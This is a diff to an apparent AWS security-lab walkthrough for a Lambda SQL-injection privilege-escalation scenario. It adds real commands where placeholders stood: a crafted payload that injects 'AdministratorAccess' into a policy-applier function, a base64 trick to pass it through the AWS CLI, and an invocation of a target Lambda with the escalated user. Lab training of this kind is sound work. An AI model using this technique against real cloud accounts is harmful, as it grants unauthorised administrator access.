@@ -35,23 +35,25 @@ we'll see what an exploit looks like in the next step.
     # contains the source code for the function.
     aws --profile assumed_role --region us-east-1 lambda get-function --function-name [policy_applier_lambda_name]
     ```
-6. Craft an injection payload to send through the CLI.
+5. Craft an injection payload to send through the CLI. This is the payload field that will be used to invoke the lambda.
 
     ```bash
-    echo "this is a bash command"
+    # This payload is being written to a file in preperation for the next step. 
+    echo "{ \"policy_names\": [\"AmazonSNSReadOnlyAccess\", \"AdministratorAccess\' --\"], \"user_name\": \"[bilbo_user_name_here]\" }" >> payload.txt
     ```
-7. Base64 encode that payload. The single quote injection character is not compatible with the aws cli command otherwise.
+6. Invoke the role applier lambda function, passing the name of the bilbo user and the base64 encoded injection payload. 
 
     ```bash
-    echo "this is a bash command"
+    # Passing an injection payload through the cli is a bit complicated. The single quote needed to perform SQL injection
+    # causes an argument parsing error for the cli, so I base64 encoded it. That process adds newline characters, which cause
+    # the same problem, so that is removed after the pipe. 
+    aws --profile assumed_role --region us-east-1 lambda invoke --function-name [policy_applier_lambda_name] --payload $(base64 payload.txt | tr -d '\n') output.txt
     ```
-8. Invoke the role applier lambda function, passing the name of the bilbo user and the injection payload. 
+7. Now that Bilbo is an admin, use credentials for that user to invoke the target lambda. 
 
     ```bash
-    echo "this is a bash command"
-    ```
-9. Now that Bilbo is an admin, use credentials for that user to invoke the target lambda. 
-
-    ```bash
-    echo "this is a bash command"
+    # This command invokes the target lambda
+    aws --profile bilbo --region us-east-1 lambda invoke --function-name cg-lambda_injection_privesc_cgid05fabeanxc-target_lambda output.txt
+    # This reads the response from the lambda
+    cat output.txt
     ```
